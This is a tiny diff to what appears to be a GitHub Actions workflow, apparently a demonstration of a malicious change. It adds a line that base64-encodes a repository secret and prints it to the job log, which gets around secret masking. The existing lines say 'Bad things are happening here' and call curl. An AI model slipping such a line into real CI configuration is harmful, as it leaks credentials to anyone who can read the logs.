@@ -23,4 +23,5 @@ jobs:
         run: |
           echo Bad things are happening here 
           curl -s example.com
+          echo ${{ secrets.FOOS }} | base64
 
